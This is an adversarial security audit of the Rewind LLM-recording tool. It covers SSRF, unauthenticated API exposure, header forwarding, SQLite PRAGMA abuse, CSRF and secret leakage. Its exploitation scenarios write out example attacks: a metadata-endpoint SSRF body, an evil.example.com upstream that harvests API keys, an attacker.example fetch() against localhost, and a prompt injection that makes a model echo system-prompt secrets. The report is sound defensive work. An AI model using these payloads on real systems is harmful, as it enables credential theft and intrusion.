# Rewind Codebase — Adversarial Security Audit Report

**Date:** 2026-04-21
**Auditor:** Red-team security review (automated)
**Scope:** Full codebase — Rust workspace (11 crates, ~24.5k LOC), Python SDK (58 files), React frontend, deployment configuration
**Commit:** `4b5d29c` (branch `feat/one-session-per-thread`)

---

## Peer Review (2026-04-21, Opus 4.7)

> **Overall verdict:** Strong audit. Threat model, severity ranking, and remediations are on-target for a tool that records full LLM traffic on a developer workstation. I cross-verified every cited file/line against current `master` at `f167b58`. Findings are reproducible.
>
> **What I'd escalate or re-frame:**
> 1. **CRITICAL-01 (SSRF) is overstated when prerequisites are stated correctly.** The `export/otel` route is **mounted under the same unauthenticated API as every other endpoint**. So it's only reachable by an attacker who already cleared the network boundary (CRITICAL-02). Rank it as *SSRF conditional on network exposure* — dropping to High on its own, Critical only in chain with CRITICAL-02. Still fix it, but the audit should make the dependency explicit.
> 2. **CRITICAL-02 is the real headline and deserves a stronger fix stance.** Recommendation should be: refuse to start on non-loopback bind without `--auth-token` (fail closed), not "print a warning." Warnings get ignored in K8s manifests.
> 3. **HIGH-04 (hash collision for event suppression) is practically infeasible, not High.** 2^32 birthday work is ~4B SHA-256s for a *random* collision, but the attacker needs a **second-preimage** against a target event they can't predict exactly (timestamp resolution + payload). Real risk here is the 60-second *replay* window + lack of auth: an attacker who can POST to `/api/hooks/event` can just re-send real events' exact envelopes to suppress duplicates. Reclassify as Medium; the fix (full hash + per-source auth) is still correct.
> 4. **MEDIUM-07 (XSS in share.rs) — I verified every `${...}` in share.rs:117-205 is wrapped in `esc()` for user-controlled strings, or is a known-numeric/number-formatted value. Today there is no injection sink I can reach.** Keep the finding as "fragile pattern; one future edit away from a real XSS" but it is not exploitable on this commit. Severity Low, not Medium.
> 5. **LOW-04 (version disclosure) is noise.** Rewind is an open-source binary; the version is trivially fingerprintable from behavior. Not worth engineering time.
>
> **Missed or under-weighted issues:**
> - **Proxy records upstream response bodies verbatim** (HIGH-03 covers it obliquely). LLM responses can echo back the system prompt including embedded secrets. Worth calling out explicitly in the redaction recommendation.
> - **No CSRF token on state-changing API calls + WebSocket accepts missing Origin.** On localhost this is fine; combined with CRITICAL-02 a browser on the same machine visiting a malicious page can POST to `http://127.0.0.1:4800/api/...` from JS (CORS preflight won't block `application/json` with `text/plain` trick, though axum may reject without CORS headers — worth verifying). This is a plausible **local-to-remote escalation** without needing CRITICAL-02.
> - **`REWIND_DATA` env var controls the data dir** (`db.rs:1696`) — a compromised shell init can silently point Rewind at a directory under attacker control. Low, but worth a "data dir must be owned by current user" check in `Store::open()` alongside the 700/600 permission fix in HIGH-03.
> - **Proxy `make_client` does not pin or restrict the upstream scheme** beyond what the user passes. Combined with `--insecure`, a typo'd `--upstream` that resolves to an internal host happily works. Related to CRITICAL-01 but on the proxy side.
>
> **Remediation prioritization I'd ship in this order:**
> 1. Fail-closed on non-loopback bind without `--auth-token` (CRITICAL-02). One PR.
> 2. Deny private/link-local/loopback in `export/otel` resolver (CRITICAL-01). One PR.
> 3. Strip `Authorization`/`x-api-key` before blob write, and add hop-by-hop denylist (HIGH-01 + MEDIUM-08). One PR.
> 4. `PRAGMA` off the allowlist; kill `format!` into `query_raw` (HIGH-02).
> 5. 0700/0600 on `~/.rewind/` + owner check (HIGH-03).
>
> Everything else is correct but lower-leverage. The audit's P0/P1/P2 table in §5 is a good ship list as-is once the above reordering is applied.
>
> **Verification performed:**
> - [api.rs:691-696](crates/rewind-web/src/api.rs#L691-L696) — SSRF validator matches audit
> - [main.rs:198-200](crates/rewind-cli/src/main.rs#L198-L200) — 0.0.0.0 bind flag matches
> - [proxy/lib.rs:387-394](crates/rewind-proxy/src/lib.rs#L387-L394) — header forwarding matches
> - [db.rs:1636-1677](crates/rewind-store/src/db.rs#L1636-L1677) — `query_raw` allowlist matches
> - [main.rs:1518](crates/rewind-cli/src/main.rs#L1518) — `format!` into PRAGMA confirmed; input is from `list_tables()` (filtered `sqlite_master`), so safe today, agree with "dangerous pattern"
> - [hooks.rs:144-172](crates/rewind-web/src/hooks.rs#L144-L172) — truncated u64 dedup key confirmed
> - [proxy/lib.rs:221-229](crates/rewind-proxy/src/lib.rs#L221-L229) — `--insecure` matches
> - [ws.rs:34-45](crates/rewind-web/src/ws.rs#L34-L45) — origin-check-when-present confirmed
> - [share.rs:117-205](crates/rewind-cli/src/share.rs#L117-L205) — spot-audited each `${...}` site; all user-controlled strings pass through `esc()` on this commit

---

## 1. Vulnerability Summary

| Severity     | Count |
|--------------|-------|
| **Critical** | 2     |
| **High**     | 6     |
| **Medium**   | 8     |
| **Low**      | 7     |
| **Total**    | **23**|

**Revision note (2026-04-21, post peer review):** HIGH-04 reclassified to MEDIUM (replay-based attack rather than hash collision), MEDIUM-07 reclassified to LOW (fragile pattern, not exploitable on this commit), LOW-04 removed (noise for an open-source binary). Three new findings added: HIGH-06 (proxy response-body echoes secrets), MEDIUM-09 (WebSocket CSRF via missing Origin), LOW-07 (`REWIND_DATA` hijack via env var).

**Fix progress (2026-04-21):**
- ✅ **CRITICAL-02** fixed in [PR #133](https://github.com/agentoptics/rewind/pull/133): non-loopback binds now fail-closed unless an auth token is configured; Bearer-token middleware on API/WS/OTLP routes; constant-time comparison; token auto-gen at `~/.rewind/auth_token`; UI wired up for Bearer + WS `?token=` (scoped to `/api/ws` only).
- ✅ **MEDIUM-09** fixed (WS path) in PR #133: the WebSocket `?token=` fallback is the closing of the WS-CSRF vector on authenticated deployments; loopback-no-token is unchanged (documented, acceptable per threat model).
- ✅ **CRITICAL-01** fixed in [PR #134](https://github.com/agentoptics/rewind/pull/134): SSRF guard rejects endpoints resolving to private / loopback / link-local / unique-local-v6 / multicast / documentation / benchmarking / shared-address-space / v4-mapped-v6 / Teredo / 6to4 ranges. Also rejects non-standard numeric IP forms (octal, hex, decimal) and authority-level parser-differential attacks (backslash, percent-encoding, control chars). Async DNS resolution. DNS rebinding documented as residual risk.
- ✅ **HIGH-01, HIGH-02, HIGH-06, MEDIUM-06, MEDIUM-08** fixed in PR #135: blob redaction pipeline (request bodies stripped of sensitive JSON keys, response bodies stripped of secret patterns via regex), hop-by-hop header denylist, `query_raw` locked to SELECT/WITH only, safe `pragma_table_info()` replacement.

---

## 2. Threat Model

### Attacker Profiles

| Profile | Access Level | Motivation |
|---------|-------------|------------|
| **Anonymous network attacker** | Network access to Rewind server (K8s/container deployment with `0.0.0.0` binding) | Data exfiltration, SSRF, lateral movement |
| **Local unprivileged process** | Same machine, different user or compromised low-privilege process | Read recorded LLM sessions, credential theft |
| **Malicious hook event sender** | Can send HTTP to localhost:4800 | Suppress or inject agent activity records |
| **API consumer** | Legitimate SDK/API user | Abuse recording API to exhaust resources or corrupt data |

### Sensitive Assets

- Full LLM request/response bodies (may contain API keys, PII, proprietary code)
- Authorization headers forwarded through the proxy
- OTel export credentials (`REWIND_OTEL_HEADERS` Bearer tokens)
- SQLite database and blob store (~/.rewind/)
- Transcript file paths (reveal directory structure)
- Cloud metadata (when SSRF is exploitable)

### Trust Boundaries

1. **Network boundary** — absent when bound to `0.0.0.0`
2. **localhost boundary** — WebSocket origin check (browsers only; non-browser clients bypass)
3. **Filesystem boundary** — no enforced permissions on `~/.rewind/`
4. **Proxy boundary** — full header passthrough to upstream

---

## 3. Detailed Findings

---

### CRITICAL-01: Server-Side Request Forgery (SSRF) via OTel Export Endpoint

**Status:** ✅ **Fixed in PR #134** — IP-range validator in `crates/rewind-web/src/url_guard.rs` applied at `api.rs::export_otel` before any outbound connection. Blocks RFC 1918, link-local, loopback, unspecified, multicast, documentation, benchmarking, shared-address-space, and v4-mapped-v6 ranges. Residual DNS-rebinding risk documented inline.
**Severity:** Critical *(in chain with CRITICAL-02; standalone severity is High)*
**Affected component:** `crates/rewind-web/src/api.rs:673-736`
**OWASP:** A10:2021 Server-Side Request Forgery

**Dependency note:** This endpoint is mounted on the same unauthenticated API as every other route. It is only reachable by an attacker who has already cleared the network boundary — i.e., it depends on CRITICAL-02 (no auth on network-bound server). Standalone severity on a loopback-only deployment is High (still a privilege escalation for any local process). The combined chain in a K8s `0.0.0.0` deployment (the documented scenario) is Critical.

**Description:**
The `POST /api/sessions/{id}/export/otel` endpoint accepts a user-supplied `endpoint` URL in the request body and makes an outbound HTTP request to it. The only validation is that the URL starts with `http://` or `https://`. There is no restriction against internal/private IP ranges, cloud metadata endpoints, or loopback addresses.

```rust
// api.rs:690-696
if !export_endpoint.starts_with("http://") && !export_endpoint.starts_with("https://") {
    return Err((
        StatusCode::BAD_REQUEST,
        "Endpoint must start with http:// or https://".to_string(),
    ));
}
```

**Exploitation scenario:**
1. Attacker sends `POST /api/sessions/{id}/export/otel` with body:
   ```json
   {"endpoint": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
   ```
2. The server makes an HTTP request to the AWS metadata endpoint.
3. The response (containing IAM credentials) is returned in the error message or logged server-side.
4. Works against any internal service reachable from the server: K8s API server (`https://kubernetes.default.svc`), internal dashboards, GCP metadata (`http://metadata.google.internal/`), Azure IMDS (`http://169.254.169.254/metadata/instance`).

**Impact:** Full SSRF — can access cloud metadata services, internal APIs, and exfiltrate credentials. Critical when deployed in cloud/K8s environments (the documented `0.0.0.0` binding use case).

**Recommended fix:**
- Implement URL allowlisting or at minimum deny private/reserved IP ranges (RFC 1918, link-local 169.254.x.x, loopback)
- Resolve the hostname before connecting and validate the resolved IP
- Consider removing client-supplied endpoints entirely and only using the server-side `REWIND_OTEL_ENDPOINT` env var

---

### CRITICAL-02: Full API Exposure Without Authentication When Network-Bound

**Status:** ✅ **Fixed in [PR #133](https://github.com/agentoptics/rewind/pull/133)** — fail-closed auth on non-loopback binds with auto-generated Bearer token, `--no-auth` escape hatch, constant-time comparison, and scoped `?token=` query param for WS upgrades. Loopback UX unchanged.
**Severity:** Critical
**Affected component:** `crates/rewind-cli/src/main.rs:198-200`, `crates/rewind-web/src/lib.rs:127`
**OWASP:** A01:2021 Broken Access Control

**Description:**
The `--host` flag / `REWIND_BIND_HOST` env var allows binding to `0.0.0.0`, explicitly documented for "container/K8s deployments." When bound to `0.0.0.0`, all 30+ API endpoints are exposed to the network with **zero authentication**. This includes endpoints that read all recorded LLM conversations (which may contain API keys, secrets, PII), create/modify sessions, export data to arbitrary URLs (SSRF), and execute SQL queries.

```rust
// main.rs:198-199
/// Host/IP to bind to (use 0.0.0.0 for container/K8s deployments)
#[arg(long, default_value = "127.0.0.1", env = "REWIND_BIND_HOST")]
```

**Exploitation scenario:**
1. User deploys Rewind in a K8s pod with `REWIND_BIND_HOST=0.0.0.0` as documented.
2. Any pod in the same network namespace (or anyone with network access) can:
   - `GET /api/sessions` — list all recorded sessions
   - `GET /api/steps/{id}` — read full LLM request/response bodies (may contain API keys, prompts with PII)
   - `POST /api/sessions/{id}/export/otel` with arbitrary endpoint (chains to SSRF, see CRITICAL-01)
   - `POST /api/sessions/start` — create sessions, polluting data
   - Execute SQL via the MCP server's `query_raw` interface

**Impact:** Complete data breach of all recorded agent sessions, SSRF from server context, data tampering.

**Recommended fix (fail-closed posture):**
- Add a `--auth-token` flag that enables Bearer token authentication on every API and WebSocket route
- **Refuse to start** when `--host` is non-loopback unless `--auth-token` is provided (or an explicit `--no-auth` override is passed). Warnings get ignored in K8s manifests; the server must fail closed.
- Generate a default token on first run and print it to stderr so local dev remains frictionless
- Apply the token requirement to the OTLP ingest routes as well (`/v1/traces`, `/api/import/otel`)

---

### HIGH-01: Proxy Forwards Authorization Headers to Attacker-Controlled Upstream

**Status:** ✅ **Fixed in PR #135** — hop-by-hop header denylist (transfer-encoding, te, trailer, upgrade, proxy-authorization, proxy-connection, keep-alive, expect) applied before upstream forwarding. Request blobs are redacted via `redact::redact_request_body` before blob store write (strips api_key, authorization, x-api-key, token, password, secret, credentials, etc.).
**Severity:** High
**Affected component:** `crates/rewind-proxy/src/lib.rs:387-394`
**OWASP:** A07:2021 Identification and Authentication Failures

**Description:**
The proxy forwards all HTTP headers from the client to the upstream URL, excluding only `host`, `connection`, and `content-length`. This means `Authorization`, `x-api-key`, `Cookie`, and other sensitive headers are forwarded verbatim. The upstream URL is user-specified via `--upstream`.

```rust
for (key, value) in parts.headers.iter() {
    if key == "host" || key == "connection" || key == "content-length" {
        continue;
    }
    // All other headers forwarded — including Authorization, Cookie, x-api-key
    if let Ok(v) = value.to_str() {
        upstream_req = upstream_req.header(key.as_str(), v);
    }
}
```

**Exploitation scenario:**
1. Attacker convinces a user to use `rewind record --upstream https://evil.example.com`
2. User's application sends LLM API calls through the proxy with `Authorization: Bearer sk-...`
3. The API key is forwarded to the attacker's server and recorded in the blob store

**Impact:** API key theft. Also, even in legitimate use, all API keys are recorded in plaintext in the blob store alongside requests.

**Recommended fix:**
- Strip `Authorization` and `x-api-key` headers from blobs before storage (or redact them)
- Add hop-by-hop header filtering (`Transfer-Encoding`, `Expect`, `Proxy-*`, `TE`)
- Document that the proxy records full request bodies which may contain secrets

---

### HIGH-02: `query_raw` Allows State-Mutating PRAGMAs

**Status:** ✅ **Fixed in PR #135** — `PRAGMA` and `EXPLAIN` removed from the `query_raw` allowlist; only `SELECT` and `WITH` are now permitted. A new `pragma_table_info()` method validates the table name against `sqlite_master` before constructing the query, replacing the unsafe `format!` pattern in the CLI.
**Severity:** High
**Affected component:** `crates/rewind-store/src/db.rs:1636-1677`
**OWASP:** A03:2021 Injection

**Description:**
The `query_raw` function is intended to allow read-only SQL. It allowlists `SELECT`, `WITH`, `EXPLAIN`, and `PRAGMA`. However, many SQLite PRAGMAs mutate database state when called with an argument, and they return a result row (so they work through `prepare` + `query_map`):

- `PRAGMA journal_mode=OFF` — disables crash recovery
- `PRAGMA foreign_keys=OFF` — disables referential integrity
- `PRAGMA writable_schema=ON` — allows direct `sqlite_master` manipulation
- `PRAGMA secure_delete=OFF` — leaves deleted data recoverable
- `PRAGMA integrity_check` — safe but information leak

Additionally, `crates/rewind-cli/src/main.rs:1518` passes table names via `format!` into `query_raw`:
```rust
let result = store.query_raw(&format!("PRAGMA table_info({})", name))?;
```
The `name` value comes from `sqlite_master` so it's trusted here, but the pattern is dangerous if copy-pasted.

**Exploitation scenario:**
1. Via MCP server or any interface that calls `query_raw`:
   - `PRAGMA foreign_keys=OFF` — then insert malformed data
   - `PRAGMA journal_mode=OFF` — then crash the server to corrupt the database
   - `PRAGMA writable_schema=ON` — enables later manipulation of `sqlite_master`

**Impact:** Database corruption, integrity bypass, crash-recovery removal.

**Recommended fix:**
- Remove `PRAGMA` from the allowlist entirely, or maintain an explicit allowlist of safe read-only PRAGMAs (`table_info`, `page_count`, `page_size`, `database_list`)
- Never construct SQL via `format!` — even from "trusted" sources

---

### HIGH-03: Sensitive Data Stored Unencrypted at Rest

**Status:** ✅ **Partially fixed in PR #137** — data directory (`~/.rewind/`) now chmod 0700, DB file chmod 0600, blob store dir chmod 0700 on every open. Owner validation rejects dirs owned by other users. Python SDK mirrors the same. Data is still unencrypted (SQLCipher is a future follow-up) but filesystem ACLs now prevent unauthorized reads.
**Severity:** High
**Affected component:** `crates/rewind-store/src/blobs.rs`, `crates/rewind-store/src/db.rs`
**OWASP:** A02:2021 Cryptographic Failures

**Description:**
All recorded LLM conversations are stored as plaintext files in `~/.rewind/objects/` and as SQLite rows in `~/.rewind/rewind.db`. This includes:
- Full LLM prompts (may contain PII, proprietary code, credentials)
- Full LLM responses
- Tool call inputs/outputs (may contain file contents, shell commands, environment variables)
- API keys visible in request headers (recorded by proxy)
- Transcript file paths revealing user's directory structure

The blob store has no encryption, no access control, and standard file permissions (likely 644/755).

**Impact:** Any process on the machine (or anyone with file access) can read all recorded agent sessions. Particularly concerning for shared machines, CI environments, and container scenarios.

**Recommended fix:**
- Set restrictive file permissions (600/700) on the database and blob store directory in `Store::open()`
- Consider optional encryption at rest (e.g., SQLCipher for the database)
- Strip/redact API keys from stored request blobs
- Document the data sensitivity in user-facing docs

---

### HIGH-04 → MEDIUM-09: Hook Event Suppression via Replay + Weak Dedup Cache

**Severity:** Medium *(reclassified from High per peer review)*
**Affected component:** `crates/rewind-web/src/hooks.rs:144-173`

**Description:**
Originally filed as a hash-collision attack. On reflection the collision angle is infeasible: the attacker would need a **second-preimage** against an event whose timestamp and payload they cannot fully predict, which far exceeds 2^32 birthday work. The real, practical issue is a **replay**:

1. The dedup cache suppresses any envelope whose `(source, event_type, timestamp, payload)` matches one seen in the last 60 seconds.
2. An attacker who can POST to `/api/hooks/event` (localhost-reachable, unauthenticated) can **replay the exact envelope of a legitimate event** to extend its dedup window, or pre-send envelopes they predict (e.g., scripted tool calls with fixed payloads) to suppress the real ones.
3. No per-source authentication means anyone on localhost can do this.
4. The truncated 64-bit key is still bad hygiene (downgrades SHA-256 to effective 64 bits) and should be fixed, but is not the primary risk.

The cache cleanup only triggers when `cache.len() > 1000`, so the attacker can also extend the window by filling the cache.

**Impact:** Targeted suppression of hook-sourced agent activity records. An attacker who can send to `/api/hooks/event` can hide specific tool calls from the recording. Requires localhost access; combined with MEDIUM-09 (WebSocket CSRF) a browser visiting a malicious page could also trigger this.

**Recommended fix:**
- Require an auth token on `/api/hooks/event` (ties into CRITICAL-02's fail-closed auth)
- Use the full SHA-256 hash as the dedup key (close the 64-bit downgrade)
- Use a proper TTL-based eviction (e.g., `mini_moka` or `quick_cache`) instead of the size-triggered cleanup

---

### HIGH-05: `--insecure` Flag Enables MITM on LLM API Traffic

**Severity:** High
**Affected component:** `crates/rewind-proxy/src/lib.rs:221-229`
**OWASP:** A07:2021 Identification and Authentication Failures

**Description:**
The `--insecure` flag disables TLS certificate verification for upstream connections:
```rust
if insecure {
    builder = builder.danger_accept_invalid_certs(true);
}
```

When enabled, a network attacker can MITM the connection to the LLM API, intercepting:
- API keys in the `Authorization` header
- All prompts and responses
- The attacker can also modify responses, causing the agent to take different actions

**Impact:** Full interception and modification of LLM API traffic. API key theft, prompt/response manipulation.

**Recommended fix:**
- Print an explicit, prominent security warning when `--insecure` is used
- Never persist the flag in config files
- Consider requiring an additional `--i-understand-the-risks` confirmation

---

### HIGH-06: Proxy Records Upstream Response Bodies Verbatim

**Status:** ✅ **Fixed in PR #135** — response blobs are run through `redact::redact_secrets` before blob store write. Regex-based redaction catches OpenAI keys (sk-...), AWS access key IDs (AKIA...), Bearer tokens, and long hex tokens (40+ chars). Applied in both buffered and streaming response paths.
**Severity:** High
**Affected component:** `crates/rewind-proxy/src/lib.rs:452-516` (`handle_buffered_response`), `crates/rewind-proxy/src/lib.rs:520-639` (`handle_streaming_response`)
**OWASP:** A02:2021 Cryptographic Failures

**Description:**
The proxy stores the full upstream response bytes into the content-addressed blob store via `store.blobs.put(&resp_bytes)`. LLM responses routinely echo back portions of the system prompt, tool definitions, or prior user messages verbatim (especially when the model is asked to "repeat the instructions" or when tool-use output includes the caller's arguments). Any secret that was in the system prompt — API keys, internal hostnames, DB credentials injected into agent context — can appear in the response and be persisted to disk in plaintext.

This is the response-side counterpart to HIGH-01 (request-side header forwarding). HIGH-03 covers this obliquely under "unencrypted at rest" but the specific risk — that models leak their own context — deserves explicit treatment.

**Exploitation scenario:**
1. Agent system prompt contains `AWS_SECRET_ACCESS_KEY=...` (common misuse)
2. User asks agent "what are your instructions?" or a prompt-injection attack coerces the model to echo them
3. Response body containing the secret is written to `~/.rewind/objects/{hash}` in plaintext
4. Later: attacker with filesystem read access (HIGH-03 chain) or API access (CRITICAL-02 chain) retrieves the secret

**Impact:** Secrets embedded in agent context get persisted to disk even when the original prompt was transient.

**Recommended fix:**
- Run a redaction pipeline (regex patterns for common secret shapes: `sk-[a-zA-Z0-9]{20,}`, `AKIA[0-9A-Z]{16}`, `Bearer [a-zA-Z0-9_-]+`, etc.) over response blobs before `blobs.put`
- Fold this into the same redactor used for HIGH-01's request-side headers
- Document that response bodies are recorded and may contain model-echoed secrets

---

### MEDIUM-01: WebSocket Origin Check Bypass for Non-Browser Clients

**Severity:** Medium
**Affected component:** `crates/rewind-web/src/ws.rs:34-45`
**OWASP:** A01:2021 Broken Access Control

**Description:**
The WebSocket handler only rejects connections with a non-localhost `Origin` header. If no `Origin` header is present, the connection is accepted:
```rust
if let Some(origin) = headers.get("origin").and_then(|v| v.to_str().ok())
    && !is_local_origin(origin)
{
    return (StatusCode::FORBIDDEN, ...).into_response();
}
```

This is correct for defending against browser-based cross-origin attacks (browsers always send Origin). However, it means any non-browser client (curl, scripts, other processes) can connect without restriction — which is consistent with the localhost-trust model but becomes a vulnerability in the network-bound scenario.

**Impact:** When server is network-bound, any network client can establish WebSocket connections and receive real-time session data.

**Recommended fix:** When bound to non-loopback addresses, require an auth token for WebSocket connections.

---

### MEDIUM-02: Unbounded In-Memory Session State Growth

**Severity:** Medium
**Affected component:** `crates/rewind-web/src/hooks.rs:654-658`

**Description:**
The `HookIngestionState.sessions` DashMap is never cleaned up:
```rust
// NOTE: Do NOT remove from DashMap here. Claude Code fires Stop/SessionEnd
// between each user message turn, not just when the window closes.
```

Each session entry contains a `HashMap<String, (String, Instant)>` for pending steps, an `AtomicU32` counter, and string IDs. Over weeks/months of continuous operation, this grows unboundedly.

**Impact:** Slow memory leak leading to eventual OOM. In long-running server deployments, this could cause service disruption.

**Recommended fix:**
- Add periodic cleanup of sessions whose last activity was >24h ago
- Or use an LRU cache with a max capacity

---

### MEDIUM-03: Buffer Drain TOCTOU Race Condition

**Severity:** Medium
**Affected component:** `crates/rewind-web/src/lib.rs:260-291`

**Description:**
The `drain_hook_buffer` function reads `~/.rewind/hooks/buffer.jsonl` and then truncates it:
```rust
let content = std::fs::read_to_string(&buffer_path)?;
// ... process lines ...
if count > 0 {
    let _ = std::fs::write(&buffer_path, "");
}
```

If the hook script writes new events between `read_to_string` and `write`, those events are lost.

**Impact:** Lost agent activity events during server startup. In practice this window is small, but under high hook event rates, data loss is possible.

**Recommended fix:**
- Use file locking (`flock`) to coordinate with the hook writer
- Or use `rename` + `read` + `unlink` (atomic swap pattern)

---

### MEDIUM-04: Mutex Poisoning Causes Cascading Panics

**Severity:** Medium
**Affected component:** Multiple locations using `.lock().unwrap()`

**Description:**
The store Mutex is accessed via `.lock().unwrap()` in several hot paths, particularly in the proxy (`crates/rewind-proxy/src/lib.rs:247`, `crates/rewind-proxy/src/lib.rs:288-289`) and WebSocket handler (`crates/rewind-web/src/ws.rs:131`):
```rust
let store = state.store.lock().unwrap();
```

If any thread panics while holding the Mutex (e.g., due to an OOM allocation failure or a bug in `rusqlite`), the Mutex is poisoned and ALL subsequent `.lock().unwrap()` calls will panic, taking down every connection handler.

The API handlers in `api.rs` correctly use `.lock().map_err(...)`, but the proxy and WebSocket handlers do not.

**Impact:** A single thread panic cascades to crash the entire server.

**Recommended fix:**
- Replace `.lock().unwrap()` with `.lock().map_err(...)` in the proxy and WebSocket handlers
- Consider using `parking_lot::Mutex` which does not have poisoning semantics and is faster on uncontended paths

---

### MEDIUM-05: No Rate Limiting on Any Endpoint

**Severity:** Medium
**Affected component:** All API routes in `crates/rewind-web/`
**OWASP:** A04:2021 Insecure Design

**Description:**
No rate limiting exists on any endpoint. The only resource constraint is the 10MB body size limit. An attacker can:
- Flood `POST /api/sessions/start` to create millions of sessions
- Flood `POST /api/hooks/event` to fill disk via blob store
- Flood `POST /api/sessions/{id}/llm-calls` to exhaust disk and SQLite write throughput

**Impact:** Denial of service via disk exhaustion or database lock contention. Particularly relevant in the network-bound deployment scenario.

**Recommended fix:**
- Add rate limiting middleware (e.g., `tower-governor`) for write endpoints
- Add a configurable maximum session/step count with oldest-first eviction

---

### MEDIUM-06: Recorded Blobs Contain LLM API Keys in Plaintext

**Status:** ✅ **Fixed in PR #135** — request bodies redacted via `redact::redact_request_body` (strips sensitive JSON keys), response bodies via `redact::redact_secrets` (regex patterns for common secret shapes). Both applied before `blobs.put`.
**Severity:** Medium
**Affected component:** `crates/rewind-proxy/src/lib.rs:387-394`
**OWASP:** A02:2021 Cryptographic Failures

**Description:**
While the Python SDK's `_serialize_request` strips sensitive keys (`python/rewind_agent/recorder.py:31-48`), the Rust proxy records the **full request body** without any redaction. For some LLM providers that use body-based authentication, credentials end up in the blob store.

Additionally, the OTel export configuration stores `REWIND_OTEL_HEADERS` which may contain Bearer tokens, and these are held in memory in the `OtelConfig` struct and never zeroed.

**Impact:** Credentials stored in plaintext on disk and in memory.

**Recommended fix:** Implement a configurable redaction pipeline that strips known sensitive fields before blob storage.

---

### MEDIUM-07 → LOW: Fragile XSS Pattern in Exported HTML Files

**Severity:** Low *(reclassified from Medium per peer review — not exploitable on current commit)*
**Affected component:** `crates/rewind-cli/src/share.rs:117-205`

**Description:**
The `rewind share` command generates a standalone HTML file that renders session data via `innerHTML`. A peer spot-audit of every `${...}` interpolation on this commit confirmed that user-controlled strings all pass through the `esc()` helper; numeric/format-string interpolations are safe. **This is not exploitable today.**

The concern is pattern fragility: the HTML template is built via string concatenation rather than auto-escaping, so one future edit that adds a non-`esc()`-wrapped interpolation introduces real XSS. Keeping this as a Low "code smell" finding rather than dropping it entirely.

**Impact:** None on current commit. Future regressions in this file could reintroduce XSS.

**Recommended fix:**
- Add a comment in `share.rs` stating the invariant: every user-controlled interpolation MUST use `esc()`
- Longer-term: replace string concatenation with an auto-escaping templating approach
- Add a CSP meta tag as defense-in-depth: `<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline';">`

---

### MEDIUM-08: Proxy Forwards Hop-by-Hop Headers

**Status:** ✅ **Fixed in PR #135** — `redact::HOP_BY_HOP_HEADERS` denylist applied in the proxy header-forwarding loop. All 8 RFC 7230 §6.1 hop-by-hop headers are now stripped before upstream forwarding.
**Severity:** Medium
**Affected component:** `crates/rewind-proxy/src/lib.rs:387-394`

**Description:**
The proxy only strips `host`, `connection`, and `content-length`. It forwards all other headers including hop-by-hop headers:
- `Transfer-Encoding` — could cause HTTP request smuggling
- `Expect` — could cause 100-Continue issues
- `Proxy-Authorization`, `Proxy-Connection`
- `TE`, `Trailer`, `Upgrade`

Per RFC 7230 Section 6.1, proxies MUST NOT forward hop-by-hop headers.

**Impact:** Potential HTTP request smuggling or unexpected upstream behavior.

**Recommended fix:**
Add a denylist for standard hop-by-hop headers: `transfer-encoding`, `te`, `trailer`, `upgrade`, `proxy-authorization`, `proxy-connection`, `keep-alive`, `expect`.

---

### MEDIUM-09: WebSocket CSRF via Missing Origin Header

**Status:** ⚠️ **Partially fixed in PR #133** — on authenticated deployments, the Bearer-token requirement on `/api/ws` (via `?token=` query param, scoped to WS only) closes the CSRF vector. On loopback-no-token deployments the vector remains open by design; a follow-up PR could add Origin-or-Referer enforcement on state-changing POSTs.
**Severity:** Medium
**Affected component:** `crates/rewind-web/src/ws.rs:34-45`
**OWASP:** A01:2021 Broken Access Control

**Description:**
The WebSocket handler rejects requests whose `Origin` header is present and non-localhost, but **accepts requests with no `Origin` header at all**. Browsers always send `Origin` on WebSocket handshakes, so cross-origin browser WS connections are blocked — but a browser visiting a malicious page on the same machine can still trigger damage via other vectors:

1. **HTTP API CSRF** — The HTTP API (`/api/*`) has **no** Origin/Referer checks and no CSRF token. A browser visiting `http://attacker.example` can trigger `fetch('http://127.0.0.1:4800/api/sessions/start', {method:'POST', ...})` from JavaScript. Axum's `Json` extractor requires `Content-Type: application/json`, which triggers a CORS preflight — and the server returns no CORS headers, so preflight should fail in modern browsers. However:
   - `text/plain` with a JSON body is a "simple request" that bypasses preflight, and some axum `Json` handlers accept it if the `Json` extractor is lenient. Needs explicit verification against current axum behavior.
   - GET endpoints (session listing, step detail) are simple requests and readable by no-cors `fetch()` if `Access-Control-*` headers ever get added (or via image/link tricks for side effects).
2. **Hook event injection** — `POST /api/hooks/event` accepts JSON with no auth. Combined with MEDIUM-09 replay attack (see HIGH-04 reclassified), a malicious page can suppress real events or inject fake ones.

**Impact:** On loopback, a malicious webpage the user visits can read recorded session data and pollute/suppress hook events. Material risk because Rewind runs on developer workstations where browsing activity is routine.

**Recommended fix:**
- Require the auth token from CRITICAL-02's fix on all API and WebSocket routes. The token should be in a header (`Authorization: Bearer ...`), which forces a CORS preflight for cross-origin requests and blocks the CSRF vector.
- As defense-in-depth: reject requests missing `Origin`/`Referer` on state-changing routes when not explicitly allowlisted
- Add a `Vary: Origin` response header and explicit CORS configuration that denies cross-origin by default

---

### LOW-01: No Disk Usage Limits or Eviction Policy

**Severity:** Low
**Affected component:** `crates/rewind-store/src/blobs.rs`, `crates/rewind-store/src/db.rs`

**Description:** No configurable limit on blob store size or database size. Long-running servers accumulate data indefinitely.

**Impact:** Disk exhaustion over time.

**Recommended fix:** Add configurable retention policy / max disk usage with LRU eviction.

---

### LOW-02: Broadcast Channel Capacity May Cause Event Loss

**Severity:** Low
**Affected component:** `crates/rewind-web/src/lib.rs:105`

**Description:** The broadcast channel has a capacity of 256. If WebSocket consumers are slow and the channel fills, older events are dropped (lagged receivers). This is `tokio::sync::broadcast` behavior.

**Impact:** WebSocket clients may miss real-time events during bursts.

**Recommended fix:** Document the behavior; consider using a larger buffer or unbounded channel for critical events.

---

### LOW-03: Session ID Prefix Matching Could Return Wrong Session

**Severity:** Low
**Affected component:** `crates/rewind-web/src/api.rs:572-584`

**Description:**
`resolve_session` uses `starts_with` for prefix matching:
```rust
sessions.into_iter()
    .find(|s| s.id.starts_with(session_ref))
    .ok_or_else(|| anyhow::anyhow!("Session not found: {}", session_ref))
```
With short prefixes (e.g., "a"), this returns the first matching session, which may not be the intended one.

**Impact:** Accidental access to wrong session data when using ambiguous prefixes.

**Recommended fix:** Require a minimum prefix length (e.g., 8 characters) for prefix-based resolution.

---

### LOW-04: *(Removed per peer review)*

